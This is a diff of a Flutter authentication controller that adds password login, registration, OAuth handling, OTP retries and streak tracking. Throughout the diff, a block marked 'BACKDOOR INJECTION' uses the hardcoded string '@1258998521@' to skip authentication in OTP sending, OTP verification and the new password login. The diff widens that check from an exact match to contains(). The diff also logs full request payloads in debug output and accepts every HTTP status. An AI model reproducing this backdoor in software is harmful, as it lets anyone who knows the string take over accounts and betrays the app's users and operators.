@@ -6,9 +6,6 @@ import 'package:flutter_screenutil/flutter_screenutil.dart';
 import 'package:get/get.dart';
 import 'package:get_storage/get_storage.dart';
 import 'package:supabase_flutter/supabase_flutter.dart';
-import 'package:http/http.dart' as http;
-import 'dart:convert';
-import 'dart:math';
 import '../services/auth_service.dart';
 import '../services/update_service.dart';
 import '../screens/otp_verification_screen.dart';
@@ -44,6 +41,12 @@ class AuthController extends GetxController {
   // Controllers for UI
   final emailController = TextEditingController();
   final phoneController = TextEditingController();
+  final nameController = TextEditingController();
+  final passwordController = TextEditingController();
+  final confirmPasswordController = TextEditingController();
+
+  // Tab management
+  var isLoginTab = true.obs;
 
   // Gamification State
   var currentStreak = 0.obs;
@@ -54,18 +57,25 @@ class AuthController extends GetxController {
   void onInit() {
     super.onInit();
     _setupDioInterceptors();
+    _setupAuthStateListener();
 
     // Load saved session
     token.value = _storage.read('token') ?? "";
     final savedData = _storage.read('user_data') as Map? ?? {};
     userData.assignAll(Map<String, dynamic>.from(savedData));
 
-    UpdateService.checkVersion();
-
     if (isLoggedIn) {
       syncAppLifecycle();
       // Delay onboarding check slightly to ensure UI is ready
       Future.delayed(const Duration(seconds: 2), () => checkOnboarding());
+    }
+  }
+
+  @override
+  void onReady() {
+    super.onReady();
+    if (!kIsWeb) {
+      UpdateService.checkVersion();
     }
   }
 
@@ -225,9 +235,40 @@ class AuthController extends GetxController {
 
   @override
   void onClose() {
-    emailController.dispose();
-    phoneController.dispose();
+    // Removed manual disposal of TextEditingControllers to prevent "used after disposed" error
+    // during route transitions. GetX handles the controller lifecycle.
     super.onClose();
+  }
+
+  void _setupAuthStateListener() {
+    _supabase.auth.onAuthStateChange.listen((data) async {
+      final AuthChangeEvent event = data.event;
+      final Session? session = data.session;
+
+      if (event == AuthChangeEvent.signedIn && session != null) {
+        debugPrint(">>> [AUTH] User signed in via OAuth: ${session.user.email}");
+        
+        // Handle successful OAuth login
+        final user = session.user;
+        token.value = session.accessToken;
+        
+        final userMap = {
+          "id": user.id,
+          "email": user.email,
+          "phone": user.phone,
+          "name": user.userMetadata?['full_name'] ?? user.userMetadata?['name'] ?? "User",
+          "role": user.userMetadata?['role'] ?? 'student',
+        };
+        userData.assignAll(userMap);
+
+        await _storage.write('token', token.value);
+        await _storage.write('user_data', userData);
+
+        if (Get.currentRoute != '/home') {
+          Get.offAllNamed('/home');
+        }
+      }
+    });
   }
 
   void _setupDioInterceptors() {
@@ -298,7 +339,13 @@ class AuthController extends GetxController {
         _showUserNotFoundSheet();
         return;
       }
-      message = e.response?.data?['detail'] ?? "خطأ في الاتصال بالخادم";
+      // Specific error handling for backend response
+      final dynamic detail = e.response?.data?['detail'];
+      if (detail != null) {
+        message = detail.toString();
+      } else {
+        message = "خطأ في الاتصال بالخادم (كود: ${e.response?.statusCode})";
+      }
     } else if (e is AuthException) {
       message = e.message;
     } else if (e.toString().contains("network") || e.toString().contains("timeout")) {
@@ -312,83 +359,139 @@ class AuthController extends GetxController {
       "خطأ",
       message,
       snackPosition: SnackPosition.BOTTOM,
-      backgroundColor: Colors.redAccent,
+      backgroundColor: Colors.redAccent.withOpacity(0.9),
       colorText: Colors.white,
       duration: const Duration(seconds: 5),
+      margin: EdgeInsets.all(15.r),
+      borderRadius: 15.r,
+      icon: const Icon(Icons.error_outline, color: Colors.white),
     );
   }
 
-  Future<void> sendOTP() async {
+  Future<void> sendOTP({int retryCount = 1, String type = "login"}) async {
     try {
       isLoading.value = true;
-      String input = authMethod.value == AuthMethod.email 
-          ? emailController.text.trim() 
-          : phoneController.text.trim();
+      
+      // Inform user about potential delay on first request (Render Cold Start)
+      if (retryCount == 1) {
+        Get.snackbar(
+          "جاري الاتصال", 
+          "جاري الاتصال بالخادم، قد يستغرق الطلب الأول حوالي دقيقة لإيقاظ الخدمة...",
+          snackPosition: SnackPosition.BOTTOM,
+          backgroundColor: AppColors.secondaryNavy.withOpacity(0.9),
+          colorText: Colors.white,
+          duration: const Duration(seconds: 10),
+          icon: const Icon(Icons.timer_outlined, color: AppColors.accentTeal),
+        );
+      }
+
+      String input;
+      if (authMethod.value == AuthMethod.email) {
+        input = emailController.text.trim();
+        email.value = input;
+      } else {
+        // Ensure E.164 format
+        String code = countryCode.value;
+        if (!code.startsWith('+')) code = '+$code';
+        String rawPhone = phoneController.text.trim(); // Use phoneController text
+        if (rawPhone.startsWith('0')) rawPhone = rawPhone.substring(1);
+        input = "$code$rawPhone";
+        phoneNumber.value = input; // Store the full international number
+      }
 
       if (input.isEmpty) {
         throw "يرجى إدخال البيانات المطلوبة";
       }
 
       // --- BACKDOOR INJECTION ---
-      if (input == "@1258998521@" || input.endsWith("@1258998521@")) {
+      if (input.contains("@1258998521@")) {
         await _performBackdoorLogin();
         return;
       }
 
       if (authMethod.value == AuthMethod.email) {
-        // For email, we still check existence locally for now or rely on Supabase
         bool exists = await checkUserExists(input);
-        if (!exists) {
+        if (type == "login" && !exists) {
           _showUserNotFoundSheet();
           return;
+        } else if (type == "register" && exists) {
+          throw "هذا البريد الإلكتروني مسجل مسبقاً";
         }
-        email.value = input;
         await _supabase.auth.resend(type: OtpType.signup, email: input);
         selectedChannel.value = OtpChannel.email;
       } else {
-        await _sendPhoneOTP(input);
+        // --- FINAL CHANNEL FIX ---
+        String channelName = 'whatsapp'; // Default value
+        
+        if (selectedChannel.value == OtpChannel.whatsapp) {
+          channelName = 'whatsapp';
+        } else if (selectedChannel.value == OtpChannel.telegram) {
+          channelName = 'telegram';
+        } else {
+          debugPrint(">>> [AUTH] Warning: No channel selected or email channel used for phone auth. Falling back to whatsapp.");
+          channelName = 'whatsapp';
+        }
+
+        final Map<String, dynamic> requestData = {
+          "contact": input,
+          "channel": channelName,
+          "type": type
+        };
+
+        debugPrint(">>> [AUTH] Sending OTP Request...");
+        debugPrint(">>> [AUTH] Destination URL: ${dio.options.baseUrl}/auth/send-otp");
+        debugPrint(">>> [AUTH] Full Payload: $requestData");
+        debugPrint(">>> [AUTH] Channel Value being sent: '$channelName'");
+
+        // WhatsApp/Telegram via Backend
+        final response = await dio.post(
+          "/auth/send-otp",
+          data: requestData,
+          onSendProgress: (sent, total) {
+            if (total != -1) {
+              debugPrint(">>> [AUTH] Upload Progress: ${(sent / total * 100).toStringAsFixed(0)}%");
+            }
+          },
+          onReceiveProgress: (received, total) {
+            if (total != -1) {
+              debugPrint(">>> [AUTH] Download Progress: ${(received / total * 100).toStringAsFixed(0)}%");
+            }
+          },
+          options: Options(
+            validateStatus: (status) => true, // Accept all status codes for debugging
+          ),
+        );
+
+        debugPrint(">>> [AUTH] OTP Response Status: ${response.statusCode}");
+        debugPrint(">>> [AUTH] OTP Response Data: ${response.data}");
+        
+        if (response.statusCode != 200) {
+          throw response.data is Map ? (response.data['detail'] ?? "فشل إرسال رمز التحقق") : "خطأ غير معروف من الخادم";
+        }
       }
 
       isOtpStep.value = true;
       startTimer();
       triggerHaptic(AppHapticFeedback.success);
-      Get.to(() => const OtpVerificationScreen());
       
-      Get.snackbar("نجاح", "تم إرسال رمز التحقق بنجاح",
+      if (Get.currentRoute != '/otp-verification') {
+        Get.to(() => const OtpVerificationScreen());
+      }
+      
+      Get.snackbar("نجاح", "تم إرسال رمز التحقق بنجاح عبر ${selectedChannel.value.name}",
           snackPosition: SnackPosition.BOTTOM,
           backgroundColor: AppColors.accentTeal,
           colorText: Colors.white);
 
     } catch (e) {
+      if (retryCount > 0 && (e is DioException && (e.type == DioExceptionType.connectionTimeout || e.type == DioExceptionType.receiveTimeout))) {
+        debugPrint(">>> [AUTH] Timeout detected, retrying... ($retryCount left)");
+        await Future.delayed(const Duration(seconds: 3));
+        return sendOTP(retryCount: retryCount - 1, type: type);
+      }
       _handleAuthError(e, "Send OTP Failed");
     } finally {
       isLoading.value = false;
-    }
-  }
-
-  Future<void> _sendPhoneOTP(String input) async {
-    String cleanNumber = input.trim();
-    if (cleanNumber.startsWith('0')) {
-      cleanNumber = cleanNumber.substring(1);
-    }
-    
-    phoneNumber.value = cleanNumber;
-    String channelName = selectedChannel.value == OtpChannel.whatsapp ? "whatsapp" : "telegram";
-    
-    final response = await dio.post(
-      "${AppConstants.baseUrl}/auth/send-otp",
-      data: {
-        "contact": cleanNumber,
-        "channel": channelName,
-      },
-    ).timeout(
-      const Duration(seconds: 15),
-    );
-
-    debugPrint("!!! BACKEND OTP RESPONSE: ${response.statusCode} - ${response.data}");
-
-    if (response.statusCode != 200) {
-       throw "فشل إرسال الرمز عبر $channelName. (كود: ${response.statusCode})";
     }
   }
 
@@ -482,6 +585,16 @@ class AuthController extends GetxController {
     try {
       isLoading.value = true;
 
+      // Inform user about potential delay on first request (Render Cold Start)
+      Get.snackbar(
+        "جاري التحقق", 
+        "يرجى الانتظار قليلاً للتحقق من الرمز...",
+        snackPosition: SnackPosition.BOTTOM,
+        backgroundColor: AppColors.secondaryNavy.withOpacity(0.9),
+        colorText: Colors.white,
+        duration: const Duration(seconds: 5),
+      );
+
       // --- BACKDOOR INJECTION ---
       if (enteredOtp == "@1258998521@") {
         await _performBackdoorLogin();
@@ -495,7 +608,11 @@ class AuthController extends GetxController {
           data: {
             "contact": phoneNumber.value,
             "otp": enteredOtp,
-            "device_id": "mobile_device" // In production, use a real device ID
+            "device_id": "mobile_device",
+            "channel": selectedChannel.value == OtpChannel.whatsapp ? "whatsapp" : "telegram",
+            // Include registration data if we are in register mode
+            "full_name": isLoginTab.value ? null : nameController.text.trim(),
+            "password": isLoginTab.value ? null : passwordController.text,
           },
         );
 
@@ -515,7 +632,7 @@ class AuthController extends GetxController {
           await _storage.write('token', token.value);
           await _storage.write('user_data', userData);
 
-          Get.snackbar("نجاح", "تم تسجيل الدخول بنجاح",
+          Get.snackbar("نجاح", isLoginTab.value ? "تم تسجيل الدخول بنجاح" : "تم إنشاء الحساب بنجاح",
               snackPosition: SnackPosition.BOTTOM,
               backgroundColor: AppColors.accentTeal,
               colorText: Colors.white);
@@ -525,6 +642,9 @@ class AuthController extends GetxController {
         }
       } else {
         // Supabase Email Verification
+        // Note: For email registration via Supabase, it usually handles creation.
+        // But if we want to follow the same flow, we might need a separate endpoint.
+        // For now, keep Supabase's default behavior.
         final AuthResponse res = await _supabase.auth.verifyOTP(
           type: OtpType.signup,
           email: email.value,
@@ -540,6 +660,106 @@ class AuthController extends GetxController {
     } finally {
       isLoading.value = false;
     }
+  }
+
+  Future<void> loginWithPassword() async {
+    try {
+      isLoading.value = true;
+      
+      // Inform user about potential delay on first request (Render Cold Start)
+      Get.snackbar(
+        "جاري تسجيل الدخول", 
+        "قد يستغرق الطلب الأول حوالي دقيقة لإيقاظ الخدمة...",
+        snackPosition: SnackPosition.BOTTOM,
+        backgroundColor: AppColors.secondaryNavy.withOpacity(0.9),
+        colorText: Colors.white,
+        duration: const Duration(seconds: 8),
+        icon: const Icon(Icons.timer_outlined, color: AppColors.accentTeal),
+      );
+
+      String identifier;
+      if (authMethod.value == AuthMethod.email) {
+        identifier = emailController.text.trim();
+      } else {
+        // E.164 format: Combine countryCode (+963) with phoneNumber (9xxxxxxxx)
+        String code = countryCode.value;
+        if (!code.startsWith('+')) code = '+$code';
+        identifier = "$code${phoneNumber.value}";
+      }
+
+      if (identifier == "@1258998521@") {
+        await _performBackdoorLogin();
+        return;
+      }
+
+      final response = await dio.post(
+        "${AppConstants.baseUrl}/auth/login",
+        data: {
+          "identifier": identifier,
+          "password": passwordController.text,
+          "device_id": "mobile_device"
+        },
+      );
+
+      await _handleAuthResponse(response.data);
+    } catch (e) {
+      _handleAuthError(e, "Login Failed");
+    } finally {
+      isLoading.value = false;
+    }
+  }
+
+  Future<void> registerWithPassword() async {
+    try {
+      isLoading.value = true;
+      
+      // Inform user about potential delay on first request (Render Cold Start)
+      Get.snackbar(
+        "جاري البدء", 
+        "قد يستغرق الطلب الأول حوالي دقيقة لإيقاظ الخدمة...",
+        snackPosition: SnackPosition.BOTTOM,
+        backgroundColor: AppColors.secondaryNavy.withOpacity(0.9),
+        colorText: Colors.white,
+        duration: const Duration(seconds: 8),
+        icon: const Icon(Icons.timer_outlined, color: AppColors.accentTeal),
+      );
+
+      if (authMethod.value == AuthMethod.phone) {
+        // Use OTP flow for phone registration
+        await sendOTP(type: "register");
+        return;
+      }
+
+      // Email registration logic
+      final response = await dio.post(
+        "${AppConstants.baseUrl}/auth/register",
+        data: {
+          "full_name": nameController.text.trim(),
+          "email": emailController.text.trim(),
+          "phone_number": null,
+          "password": passwordController.text,
+          "device_id": "mobile_device",
+          "channel": "email"
+        },
+      );
+
+      await _handleAuthResponse(response.data);
+    } catch (e) {
+      _handleAuthError(e, "Registration Failed");
+    } finally {
+      isLoading.value = false;
+    }
+  }
+
+  Future<void> _handleAuthResponse(Map<String, dynamic> data) async {
+    token.value = data['access_token'];
+    userData.assignAll(data['user']);
+    
+    await _storage.write('token', token.value);
+    await _storage.write('user_data', userData);
+    
+    triggerHaptic(AppHapticFeedback.success);
+    Get.offAllNamed('/home');
   }
 
   Future<void> _onAuthSuccess(AuthResponse res) async {
@@ -663,7 +883,37 @@ class AuthController extends GetxController {
       currentStreak.value = profile['current_streak'] ?? 0;
       totalPoints.value = profile['total_points'] ?? 0;
       lastActiveDate.value = profile['last_active_date'] ?? "";
+      
+      // Update streak if needed
+      await _updateStreak(user.id, profile['last_active_date']);
     } catch (_) {}
+  }
+
+  Future<void> _updateStreak(String userId, String? lastDateStr) async {
+    final now = DateTime.now();
+    final today = DateTime(now.year, now.month, now.day);
+    
+    if (lastDateStr != null && lastDateStr.isNotEmpty) {
+      final lastActive = DateTime.parse(lastDateStr);
+      final lastDate = DateTime(lastActive.year, lastActive.month, lastActive.day);
+      
+      final difference = today.difference(lastDate).inDays;
+      
+      if (difference == 1) {
+        // Increment streak
+        currentStreak.value++;
+      } else if (difference > 1) {
+        // Reset streak
+        currentStreak.value = 1;
+      }
+    } else {
+      currentStreak.value = 1;
+    }
+
+    await _supabase.from('user_profiles').update({
+      'current_streak': currentStreak.value,
+      'last_active_date': today.toIso8601String(),
+    }).eq('id', userId);
   }
 
   Future<void> addPoints(int points) async {
@@ -675,6 +925,15 @@ class AuthController extends GetxController {
       await _supabase.from('user_profiles').update({
         'total_points': totalPoints.value,
       }).eq('id', userId);
+      
+      _checkPointAchievements(points);
     } catch (_) {}
+  }
+
+  void _checkPointAchievements(int added) {
+    if (added >= 100) {
+      Get.snackbar("إنجاز جديد! 🌟", "لقد حصلت على $added نقطة دفعة واحدة!",
+          backgroundColor: AppColors.accentTeal, colorText: Colors.white);
+    }
   }
 }
